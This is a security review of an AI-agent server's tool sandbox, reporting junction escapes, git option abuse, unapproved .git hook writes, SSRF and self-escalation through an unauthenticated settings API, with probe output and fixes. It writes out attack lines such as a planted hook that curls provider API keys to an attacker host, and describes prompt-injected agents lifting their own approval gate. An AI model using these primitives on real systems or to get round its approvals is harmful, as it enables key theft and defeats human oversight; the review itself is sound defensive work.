# Tools, sandbox confinement and approvals — technical review

Review of `apps/server/src/tools/*`, `apps/server/src/config.ts`, `apps/server/src/server/runtime.ts`,
`apps/server/src/mcp/*`, `apps/server/src/plugins/host.ts`, `apps/server/src/vendors/{acp,registry}.ts`
and every existing test in `apps/server/src/tools/`.

**Verdict up front: the claim does not hold.** `README.md:352-354` says *"Every path funnels through one
`resolveInWorkspace` choke point that rejects `..`, absolute paths outside the root, and Windows
drive-relative tricks like `C:foo`"*. The lexical transformations it names really are rejected — but the
choke point is **lexical only, never a realpath check**, so a directory junction or symlink inside the
workspace hands out read/write/replace access to arbitrary files outside it, using the default
`node_modules` layout of any pnpm project. Independently of that, the `git` tool — documented at
`git.ts:8` as *"inspection is here, un-gated, because it cannot write"* — carries an unapproved
arbitrary-file **read** and an unapproved arbitrary-file **write** in git's own option surface. The
confinement claim fails on three separate axes (links, `run_shell`, MCP/plugin tools), and the *"un-gated
because it cannot write"* invariant fails outright.

---

## Scope & method

**Read in full:** `tools/paths.ts`, `types.ts`, `registry.ts`, `fs.ts`, `shell.ts`, `git.ts`, `code.ts`,
`match.ts`, `misc.ts`, `web.ts`, `plan.ts`, `memory.ts`, `vendor.ts`, all `tools/*.test.ts`,
`config.ts`, `server/runtime.ts` (relevant regions), `engine/turn.ts`, `mcp/manager.ts`, `mcp/client.ts`,
`plugins/host.ts`, `vendors/acp.ts` (permission + fs regions), `docs/sandbox.md`, `README.md:335-360`.

**Executed (not just read):**

| what | command | result |
| --- | --- | --- |
| tool suites | `node --test --test-isolation=none "src/tools/*.test.ts"` (in `apps/server`) | 74 tests, 70 pass, 4 skipped, 0 fail |
| confinement matrix | `node scripts/.review-probe.mjs` (throwaway, deleted afterwards) calling `resolveInWorkspace` with 30 hostile inputs | table below |
| **link escape** | created `symlinkSync(outside, ws/'escape-link', 'junction')`, then drove the real `read_file`/`write_file`/`edit_file`/`apply_patch` tools at `escape-link/...` | **read and wrote outside the workspace** |
| **git escape** | `git log --oneline -1 --output=$env:TEMP\x` and `git blame --contents=C:/Windows/win.ini` in this repo | wrote the file; printed win.ini — then confirmed the *tool* gate lets both through |
| device/ADS/dot names | drove the real `write_file`/`read_file` at `NUL`, `CON`, `sub/COM1`, `a.txt:stream`, `a.txt::$DATA`, `report.md.`, `file:secret.txt` | see matrix |
| SSRF / size | in-process loopback HTTP server + real `web_fetch` tool | loopback + redirect **reached**; 400 MB body produced **412 MB RSS growth** |
| pre-existing links | `Get-ChildItem ... -Directory | Where-Object LinkType` | 51 reparse points in this repo; `apps/server/node_modules/{tsx,typescript,ws,sqlite-vec}` are junctions pointing into `node_modules/.pnpm` (outside `apps/server`) |
| temp-file writing | `git log --output=... --format="%n@echo off%ncalc.exe%n"` | arbitrary file written with attacker-chosen content and newlines |

**Environment limits, stated plainly:** this session's file sandbox forbids piped-stdio children
(`spawn EPERM`), so `run_shell` and the git tool's *execution* path could not be exercised end-to-end —
those results are marked **UNEXERCISED** where they matter. File symlink creation also returned
`EPERM` in this sandbox, so the link escape was demonstrated with a **directory junction**, which
succeeds and is the same code path (`resolveInWorkspace` does not distinguish them, and neither does
Node's `resolve`). `pnpm test`/`pnpm typecheck` were not used, per the environment note.

Throughout: **"proven"** = I ran it and saw the result; **"unexercised"** = code reads true but the
sandbox blocked the run; **"SUSPECTED"** = reasoned from code with the reasoning given.

---

### [CRITICAL] Junction/symlink escape: the choke point is lexical, so links walk straight out of the workspace

**Evidence.** `paths.ts:11` imports only `relative, resolve` from `node:path` — there is no `fs`,
`realpath`, `lstat`, or `O_NOFOLLOW` anywhere in the file. `paths.ts:36-47` is the entire check:

```
36    const root = resolve(workspaceRoot);
37    const full = resolve(root, candidate);
39    const rootKey = key(root);          // key() = backslashes→slashes, lowercase (paths.ts:17-19)
40    const fullKey = key(full);
41    const boundary = rootKey.endsWith('/') ? rootKey : `${rootKey}/`;
42    if (fullKey !== rootKey && !fullKey.startsWith(boundary)) { throw ... }
47    return full;                        // the LEXICAL path is returned, and used directly
```

Every consumer then hands that lexical string to `node:fs`, which follows reparse points:
`fs.ts:125` (`list_dir`), `fs.ts:161` (`read_file`), `fs.ts:170` (`readFileSync`), `fs.ts:326`+`330`
(`write_file` → `writeFileSync`), `fs.ts:373`+`400` (`edit_file`), `code.ts:117`/`226`/`457` and
`code.ts:530` (`apply_patch` → `writeFileSync`). `fs.ts:127` uses `statSync` (follows links) rather than
`lstatSync` to decide "is a directory", so a junction is accepted as a directory target.

**Proven.** With `ws` and `outside` as two sibling temp directories:

```
ALLOWED  read through junction  -> C:\...\dev3d-review-ws-...\escape-link\secret.txt
  *** READ OUTSIDE WORKSPACE: "OUTSIDE-SECRET-CONTENT"
  write_file via junction -> true "Wrote escape-link/pwned.txt (6 bytes, UTF-8)."
  file landed outside? true
  read_file("link-to-outside/secret.txt") -> "   1| OUTSIDE-SECRET-CONTENT"
  write_file("link-to-outside/via-tool.txt") -> true  (landed outside)
  apply_patch via junction -> "Applied 1 edit(s) to 1 file(s)"  (outside file became "PATCHED-OUTSIDE")
  list_dir("link-to-outside") -> "secret.txt"        (target directory listed)
```

So `read_file`, `write_file`, `edit_file`, `apply_patch` and `list_dir` all read **and overwrite** files
outside the run's workspace root. `apply_patch` is the worst of them because it rewrites a whole file
from a `*** Find:` / `*** Replace:` pair.

**This needs no attacker action.** A junction is a normal thing to find in a project:
`apps/server/node_modules/typescript`, `tsx`, `ws`, `sqlite-vec` in *this* checkout are junctions into
`E:\Development\dev3d\node_modules\.pnpm\...`, which is outside the `apps/server` workspace root. So
`write_file({ path: "node_modules/typescript/lib/typescript.js", ... })` passes the guard and rewrites a
file in the shared pnpm store — outside the workspace, and shared with every other project on the
machine (supply-chain blast radius). 51 reparse points exist below depth 3 of this repo alone.

**Why the walkers are not also a vector (accidentally).** `glob`/`grep`/`search_files` never descend
through a link, because libuv reports junctions as `UV_DIRENT_LINK`, so `Dirent.isDirectory()` and
`isFile()` are both false at `code.ts:72-75` and `fs.ts:217-221`. Measured:
`Dirent for junction: isDirectory= false isSymbolicLink= true isFile= false`, and `grep`/`search_files`
reported "scanned 6 files" without entering the link. That is luck, not design; `list_dir` is
inconsistent with it and *does* follow (`fs.ts:96-104`). It also means files under a linked directory
are silently invisible to `glob`/`grep` — a correctness gap the description does not mention.

**Attack.** A prompt-injected employee (or just a model that read a hostile README) writes a junction
with `run_shell` once, or simply uses one that already exists, then reads `~/.ssh/id_rsa`,
`%APPDATA%\...\credentials`, or the office's own `.env` via `read_file`, or plants a file in the user's
Startup folder with `write_file`. No approval is involved anywhere in that path.

**Fix.** Make the containment real, in `resolveInWorkspace`:
1. Resolve the root's real path once per run: `rootReal = realpathSync.native(root)`.
2. For the candidate, resolve the real path of the *nearest existing ancestor* (walk up until
   `lstatSync` succeeds), then `realpathSync.native` that, re-append the non-existent tail, and check
   containment against `rootReal` — again after `resolve()` normalisation.
3. Separately refuse any path that traverses a reparse point: walk each component from the root with
   `lstatSync(...).isSymbolicLink()` and reject. This is the belt to (2)'s braces and it is what stops
   "the link appears between the check and the use".
4. Do the same for the writes in `write_file`/`edit_file`/`apply_patch` (they must not be allowed to
   follow a link that the read check rejected).
5. Add `resolveInWorkspace`-level tests for a junction and a file symlink — there are none today.

---

### [CRITICAL] `git`: an unapproved arbitrary-file read and an unapproved arbitrary-file write

**Evidence.** `git.ts:8` claims *"inspection is here, un-gated, because it cannot write"*. The gate is an
**exact-match deny list**:

```
64  const FORBIDDEN_ARGS = new Set(['--hard','--force','-f','--no-verify','--output','--exec',
                                      '--upload-pack','--receive-pack','clean']);
268 const hardForbidden = extra.find((a) => FORBIDDEN_ARGS.has(a));
279 const readOnlyForbidden = extra.find((a) => READ_ONLY_FORBIDDEN.has(a));
```

`Set.has` is exact equality, so the `--option=value` spelling of every entry sails past both lists.
`log`, `show`, `blame`, `diff` are all in `READ_ONLY_SUBCOMMANDS` (`git.ts:30-44`) and accept `extra`
verbatim (`git.ts:315`: `runGit([command, ...extra], ctx.workspaceRoot)`) with no cwd or path
confinement. `runGit` uses `shell:false` (`git.ts:137`), which removes shell metacharacters but does
nothing about git's own file-touching options.

**Proven.** Gates allow the argument (probe run of the real tool: `git log --output=E:/pwned.txt ->
fail | git unavailable | git could not be started`, i.e. it passed the gates and tried to spawn), and git
honours it:

```
$ git log --oneline -1 --output=$env:TEMP\dev3d-gitout-probe.txt   → wrote file? True  size=64
$ git log -1 --format="%n@echo off%ncalc.exe%n" --output=$env:TEMP\... → size=21
  CONTENT: [\n@echo off\ncalc.exe\n\n]
$ git blame --contents=C:/Windows/win.ini -- README.md
  00000000 (External file (--contents) ...  1) ; for 16-bit app support
  00000000 (External file (--contents) ...  2) [fonts]
```

Two primitives, both **outside the workspace and with no approval prompt**:
* **Read:** `git blame --contents=<any path>` prints an arbitrary file's contents into the tool result,
  i.e. into the model's context. This is a straight exfiltration path for `%USERPROFILE%\.ssh\id_rsa`,
  `C:\Users\...\AppData\Roaming\...\Login Data`, or the office's own `.env`.
* **Write:** `git log/show/diff --output=<any path>` creates and writes attacker-chosen content
  (`--format=` with `%n` gives real newlines) to any path the process can write — 21 bytes with two
  newlines landed in `%TEMP%` above. `--output` is an ordinary "open for writing" target, so a run with
  nothing to print (an empty log, a clean `git diff`) **truncates an existing file to zero bytes**;
  that last step I did not measure separately, it follows from the option's open mode rather than from a
  run I performed.

Because `git.ts:296` only asks for approval when `isWrite(command, extra)` is true (`git.ts:204-208`,
keyed off the *subcommand*), none of this reaches `requestApproval`.

**Fix.** Stop deny-listing argument strings and allow-list per subcommand, e.g.
`{ log: new Set(['--oneline','--stat','--max-count','-n','--pretty','--format','--name-only',...]), ... }`,
rejecting anything unknown. As an immediate stopgap, reject any element matching
`/^--(output|exec|upload-pack|receive-pack|contents|path|file)(=|$)/` and `/^-n$/`, and treat these as
write operations requiring approval. Also fix `-n`, which is the documented short form of the
explicitly-refused `--no-verify` (`git help commit`: *"-n, --no-verify  bypass pre-commit and commit-msg
hooks"*) — it is not in `FORBIDDEN_ARGS`, so `git commit -n -m x` (approval-gated) skips the hooks the
tool says it protects.

---

### [HIGH] `.git` control files are writable without approval, so the approved command is not the thing being approved

**Evidence.** `write_file` (`fs.ts:305-340`) has only the (lexical) workspace check; the `SKIPPED_DIRS`
set (`match.ts:17`) is applied to *directory walks only*, never to a write target. `.git` is inside the
workspace, so `write_file({ path: '.git/hooks/pre-commit', content: ... })` succeeds with no approval
and `writtenPaths` records it. `git` itself refuses `--no-verify` *specifically to keep hooks*
(`git.ts:56-63`: *"`--no-verify` skips the hooks a project installed precisely to run before a commit
lands"*) — but the same employee can author the hook. `write_file({ path: '.git/config' })` is equally
open, which gives `core.hooksPath`, `core.pager`, `core.fsmonitor`, `core.sshCommand`, and `alias.*`.

**Attack.** Employee (or a prompt-injected one) first writes `.git/hooks/pre-commit` containing
`curl -d "$DEEPSEEK_API_KEY" http://attacker/` — ungated. Then it calls
`git commit -m "save work"`, which a human approves. The approval dialog reads `git commit -m save work`
(`git.ts:298-306` builds `summary` from `[command, ...extra]`) and shows nothing about hook content; the
commit runs the planted hook. The hook inherits the full environment (`git.ts:140-146` spreads
`process.env`), and `config.ts:60-63` has already copied every `.env` assignment — including
`DEEPSEEK_API_KEY`, `OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, `OPENROUTER_API_KEY` — into `process.env`.
Net effect: **arbitrary code execution with the provider keys, behind an innocuous-looking approval.**

This is the general form of the problem: the approval is bound to the *argv* of one call, never to the
repository state that call will observe, and that state is writable by the same agent through a
different tool that asks nobody.

**Fix.** (a) Refuse `write_file`/`edit_file`/`apply_patch`/`applyPatch` targets under any `.git`
directory (`GitDir`/`WorkTree` from `git rev-parse`), or route them through the same approval the git
tool uses, and say why. (b) Include the hooks and config diff in the approval `detail`. (c) Stop the
unconditional key inheritance (see the next entry).

---

### [HIGH] `run_shell` is not confined in any way, and the shell inherits every provider API key

**Evidence.** `shell.ts:163-210` never calls `resolveInWorkspace`; `shell.ts:65-70` spawns with
`cwd: ctx.workspaceRoot` and nothing else:

```
65  child = spawn(command, {
66    cwd: ctx.workspaceRoot,
67    shell: true,          // cmd.exe semantics (shell.ts:6-8)
68    windowsHide: true,
69    stdio: ['ignore', 'pipe', 'pipe'],
70  });                     // no `env:` — the child inherits process.env wholesale
```

`cwd` is a starting directory, not a boundary: `type C:\Users\jacob\.ssh\id_rsa`, `curl` to an arbitrary
host, `mklink /J`, `reg`, `schtasks` all work. `config.ts:60-63` (`loadDotEnv`) writes every `.env` value
into `process.env`, so the child sees the provider keys. Measured in this session:
`process.env keys matching /KEY|TOKEN|SECRET|PASSWORD|API/: (none)` — the sandbox stripped them here, so
the leak is proven from code, not from this environment (**unexercised** at the secret level; the spawn
itself was `EPERM`).

**Blast radius.** The gate is one boolean: `config.ts:445` (`DEV3D_AUTO_APPROVE_SHELL=true`) →
`ctx.autoApproveShell` → `shell.ts:176` skips approval entirely. In that mode an injected instruction in
a fetched web page (see the SSRF entry) becomes unrestricted command execution plus key exfiltration.
`docs/sandbox.md:28-30` acknowledges `run_shell` "needs the same permission" as the sandbox and
"degrades honestly" — the design intent is clear, but the README sentence "every one confined to the
run's workspace root" is simply false for this tool.

**Fix.** (a) Build the child environment explicitly instead of inheriting: allow-list `PATH`, `SystemRoot`,
`TEMP`, `PATHEXT`, `COMSPEC`, `HOME`, locale vars, and drop `*_API_KEY`, `*_TOKEN`, `*_SECRET`. (b) Say
so in the README/table: `run_shell` is *approval-gated*, not *confined*. (c) Consider running the shell
under a restricted token / AppContainer on Windows if the confinement claim is to be kept.

---

### [HIGH] MCP tools and plugin tools bypass the confinement entirely

**Evidence.** `mcp/manager.ts:289-330` wraps a remote tool with `run: async (args, ctx)` and then ignores
`ctx` except for `ctx.signal`: `client.callTool(info.name, args, ctx.signal)` (`manager.ts:308`). The
arguments go to the remote server verbatim; `ctx.workspaceRoot` is never consulted, and there is no
approval call. `plugins/host.ts:279-300` (`adaptTool`) passes the plugin `workspaceRoot` as a courtesy
value and enforces nothing — a plugin tool may ignore it. Both tools are ordinary `Tool`s in the same
registry (`mcp/manager.ts:229`, `host.ts:335`) and are dispatched through the very same
`executeToolCall` path (`engine/turn.ts:245`).

**Grant policy.** `runtime.ts:418-426` (`mcpGrantedForRole`) defaults to `shell-roles`
(`config.ts:480-487`): every role that already holds `run_shell` silently receives every MCP tool.
`config.ts:186-189` documents the reasoning ("a remote server's tools are more powerful than any
built-in") — but "the same reach as `run_shell`" is the *unconfined* reach, and unlike `run_shell` an MCP
`fetch`/`http`/`shell` tool is not approval-gated either.

**Attack.** With an MCP filesystem/exec server connected, `mcp__<id>__read_file({ path: "C:/Users/..." })`
or `mcp__<id>__write_file` reaches anywhere, and nothing in the office can tell. Also: MCP servers are
`stdio` children (`manager.ts:339-347`) with their own env, or HTTP endpoints (`manager.ts:349-353`)
whose `url` comes from `mcp.json` — see `mcp/config.ts`.

**Fix.** (a) State the boundary honestly in the README: the *built-in* 15 are confined; extension tools
are somebody else's process and are not. (b) Require approval for the first call to any MCP tool (or for
any role's first use of a newly connected server), gated on `ctx.requestApproval({kind:'network'})` the
way `vendor.ts:158` does. (c) Do not auto-grant MCP tools to shell roles by default; make `'none'` the
default and require an operator to name the roles. (d) Refuse to connect a `stdio` MCP server whose
`command` is not on an allow-list.

---

### [MEDIUM] `web_fetch` is an unguarded SSRF proxy, including to the office's own unauthenticated API

**Evidence.** `web.ts:87-95` validates only that the URL parses and the protocol is `http:`/`https:`.
There is no host check anywhere — `llm/registry.ts:162` has a loopback predicate, but it is used for
provider base URLs, not here. `web.ts:100` uses `redirect: 'follow'`, so the check (if there were one)
would be defeated by a 302 anyway.

**Proven.**

```
N. http://127.0.0.1:52527/secret  ok=true  "INTERNAL-SECRET-FROM-LOOPBACK"
O. http://127.0.0.1:52527/redirect → followed → "INTERNAL-SECRET-FROM-LOOPBACK"
P. http://169.254.169.254/latest/meta-data/ → ok=false, 4ms, "Network error"   (attempted, not refused)
P. http://127.0.0.1:8787/api/state → ok=true, 50ms, 200 OK, full office-state JSON
```

The last row is the office's own HTTP API, which `index.ts:13` documents as *"nothing here
authenticates, so bind it to localhost"*. A tool call therefore reaches it: `GET /api/state`,
`/api/memory` (whole fact record), `/api/runs`, `/api/skills`, `/api/providers` are all readable by an
employee through `web_fetch` with no approval. On a cloud VM the metadata IP is the same class of bug
with credentials behind it. Note the *attempt* to reach `169.254.169.254` produced a network error
rather than a policy refusal — evidence that no guard exists.

**Fix.** Resolve the hostname, reject RFC1918 / loopback / link-local / CGNAT / IPv6 ULA /
`169.254.169.254` / `metadata.google.internal`, and re-check after each redirect (`redirect: 'manual'`
plus a bounded manual loop so the host can be re-validated per hop). Add a host allow-list option for
locked-down installs. Do not rely on DNS alone — resolve, validate the IP, then connect to that IP with
the `Host` header set, or accept the residual DNS-rebinding risk explicitly in the docs.

---

### [MEDIUM] `web_fetch` buffers the entire response before the 20 000-character cap

**Evidence.** `web.ts:103` `const rawBody = await res.text();` then `web.ts:106` caps. `res.text()`
concatenates the whole body in memory first; the 15 s timeout (`web.ts:101`) is the only bound.

**Proven.** An in-process loopback server streamed 400 MB: the tool returned 20 055 characters (correct
cap) but the process went from **86 MB to 498 MB RSS (+412 MB)** — a 1:1 mapping between remote bytes and
process memory. On a fast link 15 s is multiple GB; `DEV3D_MAX_CONCURRENCY` defaults to 4, so four
concurrent fetches multiply it. A malicious or merely enormous page can OOM the orchestrator, taking
every run with it. Nothing in the office detects this as a failure mode.

**Fix.** Read the body as a stream with a byte ceiling (e.g. 2 MB) and abort the request past it; also
cap on `content-length` up front when present. Report the truncation honestly, as `cap()` already does.

---

### [MEDIUM] The unauthenticated local HTTP API lets a tool lift its own approval gate

**Evidence.** `index.ts:1126-1136`: `POST|PUT /api/settings` calls `runtime.updateSettings(patch)` with no
authentication. `runtime.ts:1330-1349` spreads the patch over the current settings and validates only
`maxConcurrency`, `softSpendApprovalUsd`, `approvalTimeoutMs` and `modelOverrides`. So
`{"autoApproveShell": true}` is accepted, and `applySettings()` (`runtime.ts:610-619`) copies it into
`engineConfig.autoApproveShell`, which `engine/turn.ts:210` puts on every subsequent `ToolContext`.
`{"allowExternalWorkspaces": true, "workspacesRoot": "C:\\"}` is also accepted, which makes
`runtime.ts:1388`'s hard-boundary check pass for any absolute path.

**Reachability, precisely.** `web_fetch` cannot exploit it (GET only, and there is no HTTP route for
approval decisions — decisions arrive over the websocket at `index.ts:643`). But *any tool that can issue
an HTTP POST to loopback* can: an MCP server's `fetch`/`http`/`browser` tool (`mcp/manager.ts:308`), a
plugin tool, or `run_shell` once `autoApproveShell` is already on. Given the SSRF entry above proves
loopback reachability, this is **SUSPECTED** rather than proven: it requires one POST-capable extension
tool, which this repo does not ship but explicitly supports.

Also reachable this way: `/api/plugins/install` (`index.ts:1332`, behind `allowPluginInstall`),
`/api/mcp/refresh` (`index.ts:1166`), `/api/workspaces` (`index.ts:1014`).

**Fix.** Require a bearer token (generated at boot, printed to the console, or a same-origin
`Origin`+`Host` check) on every mutating route; refuse requests whose `Origin` is absent or
non-loopback; and never let a settings change take effect for a *running* run — pin the approval policy
at run start so self-escalation cannot affect the run doing the escalating.

---

### [MEDIUM] One boolean removes three unrelated gates

**Evidence.** `ctx.autoApproveShell` is read by `shell.ts:176` (any command), `git.ts:296` (any
repository write), and `vendor.ts:152` (`needsUpfrontApproval`, derived at `vendor.ts:78` from
`readOnlyEnforcement === 'requested'`, i.e. delegating to an unconfined third-party harness; `vendor.ts:86-91`
for the description, `vendor.ts:17-22` for the doc comment). `config.ts:445` and
`runtime.ts:613` set it globally for the whole installation; `runtime.ts:574` persists it in settings.

**Failure.** An operator who sets it because "the build keeps asking me to approve `pnpm test`" silently
also authorises: arbitrary shell, destructive git writes, and unattended third-party delegation into the
workspace. `README.md` and `docs/` do not enumerate this. `vendor.ts:29-32` argues for reusing the switch
("rather than a second near-identical setting being invented") — the argument is reasonable for the
*unattended-run* case but it makes the blast radius invisible at the point of decision.

**Fix.** Split into `autoApproveShell`, `autoApproveGit`, `autoApproveVendors` (or a per-tool approval
policy object), show the effective set on the Settings page next to the checkbox, and log the effective
policy at run start so a run's transcript records what was auto-approved.

---

### [MEDIUM] `git remote` and `git branch` write without approval; `remote update` also reaches the network

**Evidence.** `remote` and `branch` are in `READ_ONLY_SUBCOMMANDS` (`git.ts:30-44`) and their verbs are
not in `READ_ONLY_FORBIDDEN` (`git.ts:84-105`). `isWrite` (`git.ts:204-208`) only special-cases `stash`
and `tag`.

**Proven (gate level).** `git remote add origin https://evil.example/x.git` produced **no approval
request** in the probe (contrast `git commit`/`stash drop`, which did), then proceeded to spawn. The
tool's own description (`git.ts:213-218`) advertises `remote` as inspection.

**Impact.** `git remote add|set-url|remove|prune|update` mutates `.git/config` and remote-tracking refs
with no human in the loop. `git remote update` performs a **fetch** — network egress and remote content
into the repository — from a URL the agent just chose. `git branch <name>` also writes refs.
Individually these are not RCE; combined with the hook/config entry above they are the setup half of an
attack that ends in code execution.

**Fix.** Treat verb-bearing subcommands as writes: for `remote`, allow only `-v`/`show -n` un-gated and
require approval for `add|set-url|set-head|remove|prune|update`; for `branch`, allow only the listing
forms un-gated.

---

### [LOW] Reserved device names are unguarded in code (measured benign on this Windows build)

`resolveInWorkspace` happily returns `<ws>\NUL`, `<ws>\CON`, `<ws>\sub\COM1` (probe: `ALLOWED` for all
four). `fs.ts` then opens them. On this machine that produced **real files**: `write_file('NUL') →
"Wrote NUL (12 bytes)"`, `read_file('NUL')` returned the content, `list_dir` listed `NUL`, and
`existsSync` was true for all three. So it is **not exploitable here** — but nothing in `paths.ts`
rejects the names, and a device-mapped open (a plausible outcome on another Windows configuration, or
through `cmd.exe` in `run_shell`, where `NUL` is definitely the device) would make "wrote a file" a lie
while `writtenPaths` (`fs.ts:331`) records a path that no later tool can see. The same class let the
earlier `\\?\`-style prefixes through the string check, where they happened to be caught by the prefix
comparison instead.

**Fix.** Reject a final path component matching `/^(CON|PRN|AUX|NUL|COM[1-9]|LPT[1-9])(\..*)?$/i` (and
the same with a trailing space or dot), and reject paths containing a `:` after the drive letter
(which also closes the ADS case below).

### [LOW] NTFS alternate data streams are an invisible-write channel inside the workspace

`write_file('a.txt:stream')` and `write_file('a.txt::$DATA')` both succeeded (`"Wrote a.txt:stream (11
bytes)"`) and `read_file('a.txt:stream')` read the content back, while `readdirSync` showed only `a.txt`
— no extra file appeared. `glob`, `grep`, `search_files` and `list_dir` cannot see streams. It is
confined (an ADS on an outside path is blocked by the `..` check), so this is not an escape: it is a
place to stash content that the operator's own inspection tools will never show, and it makes the
`affectsPaths`/`writtenPaths` record disagree with the tree.

**Fix.** Reject a `:` anywhere in a candidate path after the drive prefix.

### [LOW] Case-folded containment key is wrong on case-sensitive NTFS directories

`key()` (`paths.ts:17-19`) lowercases both sides, so the containment test is a case-insensitive prefix
match. On NTFS with per-directory case sensitivity enabled (`fsutil file setCaseSensitiveInfo`), `C:\WS`
and `C:\ws` can be two distinct directories: a candidate that resolves to `C:\WS\evil` is lexically
`c:/ws/evil` and passes the check while the real target is a different directory from the root.
**SUSPECTED** (I did not create a case-sensitive directory to prove it); the ordinary Windows case is
correct and this only matters for WSL-style trees. Fix: compare using the real on-disk spelling from
`realpathSync.native` on both sides rather than a lowercased copy, and prefer a
`path.relative(root, full)`-based check (`rel !== '..' && !rel.startsWith('..' + sep) && !isAbsolute(rel)`)
over string prefixes — it is also immune to the sibling-directory-prefix bug.

### [LOW] `vendor.ts` claims to drop out-of-workspace paths; it does not

`vendor.ts:212-227` says *"anything that does not resolve inside the workspace is dropped rather than
recorded"* and `vendor.ts:242-250` implements that with `toWorkspaceRelative` inside a `try` whose
comment says *"`toWorkspaceRelative` refuses anything outside the root"*. It does not: `paths.ts:55-60`
is `relative()` plus slash conversion and never throws. Proven:
`toWorkspaceRelative(ws, outside/secret.txt)` returned `"../dev3d-review2-out-iTaCo6/secret.txt"`.
So the `catch` at `vendor.ts:246` is unreachable, the `notes.push` at `vendor.ts:226` never fires, and a
vendor-reported path outside the workspace reaches `affectsPaths` → `turn.wroteFiles`
(`engine/turn.ts:506-509`) as a `../` path. Compare `vendors/acp.ts:558-564` (`safeRelative`), which
*calls* `resolveInWorkspace` first and is therefore correct — the two disagree about what
`toWorkspaceRelative` guarantees. Fix: call `resolveInWorkspace(workspaceRoot, candidate)` before
relativising in `relativeOrNull`, or export a `isInsideWorkspace()` predicate and use it in both places.

### [LOW] Plugin entry-path check is a bare string prefix

`plugins/host.ts:307-308`: `if (!entryPath.startsWith(resolve(directory))) throw`. `C:\plugins\foo-evil\x.js`
starts with `C:\plugins\foo`, so a sibling directory satisfies "escapes the plugin directory". The
plugin directory is operator-controlled, so this is defence-in-depth only. Fix: compare with a separator
(`entryPath === dir || entryPath.startsWith(dir + sep)`) or use `path.relative`.

### [LOW] `run_shell` timeout is not enforced against grandchildren (UNEXERCISED)

`shell.ts:84-91` starts a timer that calls `child.kill('SIGKILL')`, but the promise settles only on
`child.on('close')` (`shell.ts:116`). Two consequences, both reason-only because `spawn` was `EPERM`
here: (a) on Windows `kill` terminates the direct `cmd.exe` child, not the tree it started, so
`start /B …`, `msiexec`, or any grandchild keeps running after the tool reports "timed out and was
killed" (`shell.ts:129`); (b) `close` waits for the stdio pipes to close, so a grandchild holding the
inherited pipe write end can keep the tool call — and the run — hanging well past `MAX_TIMEOUT_MS`
(`shell.ts:15`), while `timedOut` is already true. **SUSPECTED**, fix by using a job object / `taskkill
/T /F` on the pid tree, and by settling the promise on a hard deadline rather than only on `close`.

### [LOW] Tool output reaches the model with no control-character sanitisation

`engine/turn.ts:511` pushes `content` straight into `messages` as a `tool` role message, after only a
length cap (`turn.ts:39`, `turn.ts:49-51`, which does append an honest
`"… [result truncated at 8000 characters]"` marker). Nothing strips ANSI escapes, C0 control characters,
bidi overrides, or zero-width characters — and `web_fetch` (`web.ts:106`) passes non-HTML bodies through
verbatim, so an attacker-controlled page lands in the prompt as-is. `stripHtml` (`web.ts:56-64`) is
regex-based and only special-cases `<script>`/`<style>`/comments. Tool output is also composed of
attacker-influenced strings by design (`read_file` of a hostile README, `git show` of a hostile commit
message, `web_search` snippets at `web.ts:215-217`). This is inherent prompt-injection surface, not a
bug per se, but it is unbounded and undocumented.

Fix: strip `[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]` and ANSI CSI sequences at the tool boundary, and wrap
tool output in an explicit untrusted-content fence with a one-line warning in the system prompt.

### [INFO] What the confinement check *does* get right

`\\server\share\x`, `\\?\C:\Windows\x`, `\\.\C:\Windows\x`, `D:\Windows`, `C:foo`, `c:foo`, `D:bar`,
`C:/`, `C:\`, `..\..\evil.`, `..\..\evil `, `..\..\PROGRA~1`, `a/../../b`, `a\..\..\b`,
`file:///C:/Windows/win.ini`, a `\u0000` inside the name and a 10 001-component path were all either
**blocked** or resolved to a path that fails at the OS layer (`file://` produced `ENOENT` in
`mkdirSync`). Unicode homoglyphs (`．．`, `∕`) are not separators on Windows, so they resolve to literal
in-workspace filenames, not escapes. Bare `C:` resolves to the workspace root itself when the root is on
`C:` and is blocked when the root is on another drive (measured both ways) — benign either way. The
`DRIVE_RELATIVE_RE` guard (`paths.ts:14`, `paths.ts:30-34`) is doing real work here and its test
(`tools.test.ts:40-41`) is meaningful.

---

## Confinement test matrix

All rows are raw output from `scripts/.review-probe.mjs` (deleted after the review) against
`resolveInWorkspace(ws, input)` or the named tool with `ws` = a temp workspace and `outside` = a sibling
temp directory. "Blocked by" cites the line that refuses.

| # | Vector | Attempted input | Blocked? | Where it is blocked / noted | Notes |
| --- | --- | --- | --- | --- | --- |
| 1 | plain relative | `a/b.txt`, `.` | allowed (correct) | `paths.ts:42` passes | resolves inside `ws` |
| 2 | `..` traversal | `../escape`, `a/../../escape` | **blocked** | `paths.ts:42-46` | proven |
| 3 | absolute outside | `C:\...\dev3d-review-out-...` | **blocked** | `paths.ts:42-46` | proven |
| 4 | absolute + `..` | `<outside>\..\x` | **blocked** | `paths.ts:42-46` | proven |
| 5 | drive-relative | `C:foo`, `c:foo`, `D:bar`, `C:Windows` | **blocked** | `paths.ts:30-34` (`DRIVE_RELATIVE_RE`) | proven; the guard earns its keep |
| 6 | bare drive | `C:` | allowed → resolves to `ws` (root on C:), blocked when root is on `E:` | `paths.ts:42` | benign, inconsistent |
| 7 | back/forward slash mix | `a/../../b`, `a\..\..\b` | **blocked** | `paths.ts:42-46` | both are separators on Windows |
| 8 | UNC share | `\\server\share\x` | **blocked** | `paths.ts:42-46` | Node treats it as absolute |
| 9 | `\\?\` / `\\.\` device prefix | `\\?\C:\Windows\x`, `\\.\C:\Windows\x` | **blocked** | `paths.ts:42-46` | proven |
| 10 | 8.3 short name | `..\..\PROGRA~1` | **blocked** | `paths.ts:42-46` (the `..` normalises away, short name != root spelling) | no standalone escape: the root must be a literal prefix |
| 11 | trailing dot / space | `..\..\evil.`, `..\..\evil ` | **blocked** | `paths.ts:42-46` | escape still lexical |
| 12 | trailing dot, in-workspace | `write_file('report.md.')` | allowed | `fs.ts:326-330` | file created *with* the dot; `read_file('report.md')` then fails — a real name mismatch, not an escape |
| 13 | reserved device names | `NUL`, `CON`, `sub/COM1` (write+read) | allowed, unguarded | `paths.ts:42`, then OS | **measured benign**: real files created and read back on this build |
| 14 | NTFS ADS (in-workspace) | `write_file('a.txt:stream')`, `a.txt::$DATA` | allowed, unguarded | `paths.ts:42` | content round-trips; invisible to `list_dir`/`glob`/`grep` |
| 15 | NTFS ADS (outside) | `..\secret.txt:stream` | **blocked** | `paths.ts:42-46` | the `..` is caught first |
